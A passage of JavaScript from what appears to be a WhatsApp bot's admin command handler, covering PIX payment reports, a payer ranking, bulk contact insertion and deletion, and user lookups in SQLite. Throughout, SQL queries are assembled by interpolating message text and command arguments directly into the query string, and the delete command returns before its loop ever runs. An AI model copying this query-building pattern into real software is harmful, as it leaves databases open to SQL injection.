'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }

            Texto = `GERANDO RELATÓRIO DE PIXs INSERIDOS DE ${Data_DIV[1]} ATÉ ${Data_DIV[2]}`

            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()

            Array_Dados = await DataBase_Better.prepare(`SELECT NUMERO_QUEM_GEROU, SUM( VALOR ) AS TOTAL FROM PIX_COPIA_COLA WHERE PROCESSADO = 1 AND DATA_INSERIDO_MS BETWEEN ${Date_Inicio} AND ${Date_Fim} GROUP BY NUMERO_QUEM_GEROU ORDER BY TOTAL DESC`).all();
            // Array_Dados = await DataBase_Better.prepare(`SELECT NUMERO_QUEM_GEROU, SUM( VALOR ) AS TOTAL FROM PIX_COPIA_COLA WHERE PROCESSADO = 1  /* Valor pago com sucesso */ AND DATA_INSERIDO_MS BETWEEN 1655694000000 AND 1655694000000 GROUP BY NUMERO_QUEM_GEROU ORDER BY TOTAL DESC LIMIT 10`).all();

            data = new Date(parseInt(Date.now())).toLocaleString()
            Nome_File_Visual = `RELATÓRIO DE PIXs INSERIDOS DE ${Data_DIV[1]} ATÉ ${Data_DIV[2]} ${Nome_Dono} Data ${data}.txt`
            console.log(Nome_File_Visual)
            Nome_File_Visual = Nome_File_Visual.toString().replace(/\//igm, ' ');
            Nome_File_Visual = Nome_File_Visual.replace(/\:/igm, ' ');
            Nome_File = __dirname + `\\Misc\\${Nome_File_Visual}`

            message = fs.createWriteStream(Nome_File);
            message.write(`RELATÓRIO DE PIXs INSERIDOS DE ${Data_DIV[1]} ATÉ ${Data_DIV[2]}\n`);
            console.log(Array_Dados)
            for (var index = 0; index < Array_Dados.length; index++) {

                console.log(Array_Dados[index]["NUMERO_QUEM_GEROU"])
                Contato = Array_Dados[index]["NUMERO_QUEM_GEROU"].toString().replace(/[^0-9]/igm, '');

                message.write(`wa.me/${Contato} - R$:${Array_Dados[index]["TOTAL"]}\n`);
                if (index === parseInt(Array_Dados.length) - 1) {
                    //console.log("Fim Loop")
                    await delay(2000)

                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendFile',
'${Nome_File_Visual}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'${Nome_File}',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                }
            }
            Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/relatorio_pixtop===") > -1 && Adms.includes(Numero)) {
            //relatorio_pixtop===MES/DIA/ANO===MES/DIA/ANO===QUANTOS_USUARIOS
            //relatorio_pixtop===06/01/2022===06/20/2022===10

            Data_DIV = Mensagem_Texto.split("===")
            Array_Total_Igual = Mensagem_Texto.match(/\=/igm);

            if (Data_DIV[1] === "NaN" || Data_DIV[2] === "NaN" || Data_DIV[1] === "" || Data_DIV[2] === "" || Data_DIV[3] === "" || Array_Total_Igual.length != 9) {
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }

            Date_Inicio = new Date(Data_DIV[1]).getTime();
            console.log(Date_Inicio)
            Date_Fim = new Date(Data_DIV[2]).getTime();
            console.log(Date_Fim)
            Total_usuarios = Data_DIV[3]
            console.log(Total_usuarios)

            Array_Dados = await DataBase_Better.prepare(`SELECT NUMERO_QUEM_GEROU, SUM( VALOR ) AS TOTAL FROM PIX_COPIA_COLA WHERE PROCESSADO = 1 AND DATA_INSERIDO_MS BETWEEN ${Date_Inicio} AND ${Date_Fim} GROUP BY NUMERO_QUEM_GEROU ORDER BY TOTAL DESC LIMIT ${Total_usuarios}`).all();

            Array_Montando = []
            Array_Montando.push(`▁ ▂ ▃ ▄ ▅ *RANKING PIX TOP ${Total_usuarios}* ▅ ▄ ▃ ▂ ▁`)
            Array_Montando.push("")
            Array_Montando.push(`*De ${Data_DIV[1]} até ${Data_DIV[2]}*`)
            Array_Montando.push("")

            for (var index = 0; index < Array_Dados.length; index++) {
                Contato = Array_Dados[index]["NUMERO_QUEM_GEROU"].toString().replace(/[^0-9]/igm, '');
                Array_Montando.push(`wa.me/${Contato} - R$:${Array_Dados[index]["TOTAL"]}`)
            }
            Texto = `${Array_Montando.join("\n")}`
            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
            Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/addcontatos===") > -1 && Adms.includes(Numero)) {

            Array_Total_Igual = Mensagem_Texto.match(/\=/igm);
            msg = Mensagem_Texto.split("===")

            if (msg[1] === "" || Array_Total_Igual.length != 3) {
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }

            Array_Fila_Espera = []
            try {
                Texto = "Inserindo contatos no banco de dados..."
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()

                Linhas = Mensagem_Texto.split("\n")
                try {
                    Contagem_Abastecidas = 0
                    Contagem_Duplicadas = 0

                    for (var index = 0; index < Linhas.length; index++) {
                        try {

                            Abastecendo = true

                            Linha = Linhas[index].replace(/\/addcontatos\=\=\=/igm, '');
                            Linha = Linha.replace(/[^0-9\n]/igm, '');
                            Linha = `${Linha}@c.us`

                            console.log(`Inserindo Contato ${Linha}...`)

                            Ja_Tem = await DataBase_Better.prepare(`SELECT * FROM CONTATOS WHERE ID_CONTATO = '${Linha}'`).all()
                            await delay(10)
                            if (Ja_Tem.length != 0) {
                                Contagem_Duplicadas = parseInt(Contagem_Duplicadas) + 1
                                console.log("Duplicada")
                                console.log(Contagem_Duplicadas)
                            } else {
                                console.log("Entrando...")

                                await DataBase_Better.prepare(`INSERT INTO CONTATOS (ID_CONTATO,DATA_MS_INSERIDO) VALUES ('${Linha}','${Date.now()}') ON CONFLICT DO NOTHING`).run()
                                Contagem_Abastecidas = parseInt(Contagem_Abastecidas) + 1
                                console.log(`${Contagem_Abastecidas} Contatos inseridos! Restam: ${Linhas.length}`)

                            }
                        } catch (error) {
                            console.log(error)

                            Texto = `*Ocorreu algum problema!*

Erro: ${error}`
                            for await (adm of Adms) {
                                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3_ADMS_GRUPOS (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${adm}@c.us',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                            }
                            Abastecendo = false
                            return
                        }
                    }

                    Texto = `*CONTATOS INSERIDOS COM SUCESSO*

${Linhas.length} Contatos a inserir.

${Contagem_Abastecidas} Contatos inseridos.

${Contagem_Duplicadas} Contatos duplicados.`
                    for await (adm of Adms) {

                        await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3_ADMS_GRUPOS (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${adm}@c.us',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    }
                    Abastecendo = false
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

                } catch (error) {
                    Texto = `Erro === ${error}`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                }

            } catch (error) {
                Texto = `Erro === ${error}`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }
            return
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/delcontatos===") > -1 && Adms.includes(Numero)) {

            Array_Total_Igual = Mensagem_Texto.match(/\=/igm);
            msg = Mensagem_Texto.split("===")

            if (msg[1] === "" || Array_Total_Igual.length != 3) {
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }

            Array_Fila_Espera = []
            try {
                Texto = "Deletando contatos do banco de dados..."
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

                Linhas = Mensagem_Texto.split("\n")
                try {
                    Contagem_Abastecidas = 0

                    for (var index = 0; index < Linhas.length; index++) {
                        try {

                            Abastecendo = true

                            Linha = Linhas[index].replace(/\/delcontatos\=\=\=/igm, '');
                            Linha = Linha.replace(/[^0-9\n]/igm, '');
                            Linha = `${Linha}@c.us`

                            console.log(`Deletando Contato ${Linha}...`)

                            await DataBase_Better.prepare(`DELETE FROM CONTATOS WHERE ID_CONTATO = '${Linha}'`).run();

                            Contagem_Abastecidas = parseInt(Contagem_Abastecidas) + 1
                            console.log(`${Contagem_Abastecidas} Contatos Deletados! Restam: ${Linhas.length}`)

                        } catch (error) {
                            console.log(error)

                            Texto = `*Ocorreu algum problema!*

Erro: ${error}`
                            for await (adm of Adms) {
                                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3_ADMS_GRUPOS (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${adm}@c.us',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                            }
                            Abastecendo = false
                            return
                        }
                    }

                    Texto = `*CONTATOS DELETADOS COM SUCESSO*

${Linhas.length} Contatos a deletar.

${Contagem_Abastecidas} Contatos deletados.`
                    for await (adm of Adms) {
                        await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3_ADMS_GRUPOS (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${adm}@c.us',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    }
                    Abastecendo = false
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

                } catch (error) {
                    Texto = `Erro === ${error}`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                }
            } catch (error) {
                Texto = `Erro === ${error}`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }
            return
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/infouser===") > -1 && Adms.includes(Numero)) {

            msg = Mensagem_Texto.split("===")
            NUMERO = msg[1]
            NUMERO_normal = NUMERO
            NUMERO = `${NUMERO}@c.us`

            Array_Total_Igual = Mensagem_Texto.match(/\=/igm);

            if (NUMERO === "" || Array_Total_Igual.length != 3) {

                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }

            CONTATO_ID = await DataBase_Better.prepare(`SELECT ID_CONTATO FROM CONTATOS WHERE ID_CONTATO = '${NUMERO}'`).get()
            //console.log(CONTATO_ID)
            if (CONTATO_ID === undefined) {
                Texto = `Usuário não encontrado`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }

            DATA_MS_INSERIDO = await DataBase_Better.prepare(`SELECT DATA_MS_INSERIDO FROM CONTATOS WHERE ID_CONTATO = '${NUMERO}'`).get()["DATA_MS_INSERIDO"]
            DATA_MS_INSERIDO = new Date(parseInt(DATA_MS_INSERIDO)).toLocaleString()

            SALDO_USUARIO = await DataBase_Better.prepare(`SELECT SALDO FROM CONTATOS WHERE ID_CONTATO = '${NUMERO}'`).get()["SALDO"]
            SALDO_USUARIO = parseFloat(SALDO_USUARIO).toFixed(2);

            NUMERO_INDICADOR = await DataBase_Better.prepare(`SELECT NUMERO_INDICADOR FROM CONTATOS WHERE ID_CONTATO = '${NUMERO}'`).get()["NUMERO_INDICADOR"]
            if (NUMERO_INDICADOR === "0") {
                NUMERO_INDICADOR = "Não foi indicado."
            } else {
                NUMERO_INDICADOR = (NUMERO_INDICADOR).replace(/\@c\.us/igm, "")
                NUMERO_INDICADOR = `wa.me/${NUMERO_INDICADOR}`
            }

            TOTAL_INDICADOS = await DataBase_Better.prepare(`SELECT ID_CONTATO FROM CONTATOS WHERE NUMERO_INDICADOR = '${NUMERO}'`).all();//length

            BONUS_INDICACAO = await DataBase_Better.prepare(`SELECT BONUS_INDICACAO FROM CONTATOS WHERE ID_CONTATO = '${NUMERO}'`).get()["BONUS_INDICACAO"]

            CONTATOS = await DataBase_Better.prepare(`SELECT ID_CONTATO FROM CONTATOS`).all()
            db = new sqlite3.Database(Diretorio_SQLITE_Principal);
            db.serialize(async function () {
                db.run("begin transaction");
                Array_Dados = []
                for (var index = 0; index < CONTATOS.length; index++) {
                    Total_Indicados = await DataBase_Better.prepare(`SELECT ID_CONTATO FROM CONTATOS WHERE NUMERO_INDICADOR = '${CONTATOS[index]["ID_CONTATO"]}'`).all()
                    if (Total_Indicados.length === 0) {
                        continue
                    }
